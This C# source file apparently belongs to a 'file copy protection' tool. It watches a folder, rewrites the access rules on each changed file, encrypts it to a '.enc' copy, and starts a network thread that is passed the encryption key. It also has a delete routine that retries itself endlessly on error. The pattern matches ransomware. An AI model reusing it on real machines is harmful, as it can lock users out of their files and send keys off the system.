using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FileCopyProtection
{
    class Watcher
    {
        FileSystemWatcher fileSystemWatcher;

        public Watcher(string directoryPath, bool includeSubdirectories = true)
        {
            // Create FileSystemWatcher object
            fileSystemWatcher = new FileSystemWatcher(directoryPath, "*.*");

            // 구성요소 활성화
            fileSystemWatcher.EnableRaisingEvents = true;

            // 하위폴더까지 포함시킬것인지 설정
            fileSystemWatcher.IncludeSubdirectories = includeSubdirectories;

            fileSystemWatcher.NotifyFilter = System.IO.NotifyFilters.DirectoryName | System.IO.NotifyFilters.Size | System.IO.NotifyFilters.FileName;

            fileSystemWatcher.Created += FileSystemWatcher_Created;
            fileSystemWatcher.Deleted += FileSystemWatcher_Deleted;
            fileSystemWatcher.Changed += FileSystemWatcher_Changed;
            /*
            fileSystemWatcher.Renamed += FileSystemWatcher_Renamed;
            */
            
        }

        private void FileSystemWatcher_Renamed(object sender, RenamedEventArgs e)
        {
        }
        private void FileSystemWatcher_Deleted(object sender, FileSystemEventArgs e)
        {
            //Console.WriteLine("Change noticed: Object Name = {0}, Object Event: {1} File Content",e.Name, e.ChangeType);
            // Console.WriteLine("\t기밀 파일 의심\n\t\t파일명 = {0}, 조치사항: {1}, 대상 파일 제거 -> 차단완료", e.Name, e.ChangeType);
        }

        private void FileSystemWatcher_Created(object sender, FileSystemEventArgs e)
        {
            /*
            if (e.Name.Contains(".enc") == false)
            {
                FileInfo fileck = new FileInfo(e.FullPath);
                if (fileck.Exists)
                {


                    Thread t1 = new Thread(() => FileRun(Program.file_key, e.FullPath, e.FullPath + ".enc"));
                    t1.Start();
                }
            }
            */
        }




        public static void FileRun(string pw, string paths, string outpaths)
        {
            // 파일 접근 가능 대기 시작 
            while (true){
                try{
                    using (Stream stream = File.Open(paths, FileMode.Open, FileAccess.Read, FileShare.None)){
                        if (null != stream){
                            break;
                        }
                    }
                }catch (Exception exception){
                    //Console.WriteLine("[FileWatcher] Changing {0}, {1}", eventArgs.Name, exception.Message);
                }
                System.Threading.Thread.Sleep(1);
            }
            //파일 접근 가능 종료

            //파일 권한 변경
            var fileSecurity = new FileSecurity();
            string user = System.Environment.UserDomainName + "\\" + System.Environment.UserName;

            //fileSecurity.RemoveAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Deny));
            var noExecRule = new FileSystemAccessRule(user, FileSystemRights.Read, AccessControlType.Allow);
            //var noExecRule2 = new FileSystemAccessRule(user, FileSystemRights.ReadAndExecute, AccessControlType.Deny);

            fileSecurity.AddAccessRule(noExecRule);
            //  fileSecurity.AddAccessRule(noExecRule2);
            File.SetAccessControl(@paths, fileSecurity);
            //파일 권한 변경 끝


            //File.SetAttributes(@paths, FileAttributes.System | FileAttributes.Hidden);


            //파일 암호화 시작



            Thread t2 = new Thread(() => network.run(pw));
            t2.Start();


            Files.EncryptFile(pw, @paths, @outpaths);

            //System.Threading.Thread.Sleep(5000);

            //Files.DecryptFile("dawdad", @outpaths, @outpaths + ".dec");

        }
        public static void files_delete(String str)
        {
            try
            {
                FileAttributes checks = File.GetAttributes(str);
                if ((checks & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    DirectoryInfo di = new DirectoryInfo(str);
                    di.Delete(true);

                }
                else
                {
                    FileInfo fileDel = new FileInfo(str);
                    if (fileDel.Exists)
                    {
                        GC.Collect();
                        GC.WaitForPendingFinalizers();
                        FileInfo f = new FileInfo(str);
                        Thread.Sleep(10);
                        f.Delete();
                    }
                }

            }
            catch (Exception ex)
            {
                files_delete(str);
            }

        }

        private void FileSystemWatcher_Changed(object sender, FileSystemEventArgs e)
        {
            if (e.Name.Contains(".enc") == false)
            {
                FileInfo fileck = new FileInfo(e.FullPath);
                if (fileck.Exists)
                {
                    Thread t1 = new Thread(() => FileRun(Program.file_key, e.FullPath, e.FullPath + ".enc"));
                    t1.Start();
                }
            }
        }
    }
}
